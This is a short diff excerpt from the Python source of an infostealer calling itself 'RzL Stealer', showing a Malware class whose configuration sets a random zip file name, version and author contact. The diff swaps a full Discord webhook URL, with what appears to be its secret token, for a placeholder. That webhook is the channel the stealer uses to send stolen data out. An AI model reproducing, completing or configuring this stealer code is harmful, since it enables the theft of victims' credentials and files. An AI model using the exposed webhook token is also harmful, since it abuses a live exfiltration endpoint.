@@ -24,7 +24,7 @@ class Paths:
 class Malware:
     def __init__(self):
         self.zip_name = f"SK_{random.randint(10000000000, 99999999999)}.zip"
-        self.webhook_url = "https://discord.com/api/webhooks/1536213881377128548/72Q3UN80YoZEKaZr1AqH5tBDOhopcEuNYgM94lDJVSijkCconJ-oLYW3YfpvA0WL1g7c"
+        self.webhook_url = "webhookaqui"
         self.stealer_version = "1.5.2"
         self.malware_name = "RzL Stealer"
         self.malware_author = "https://t.me/raziel_sec"
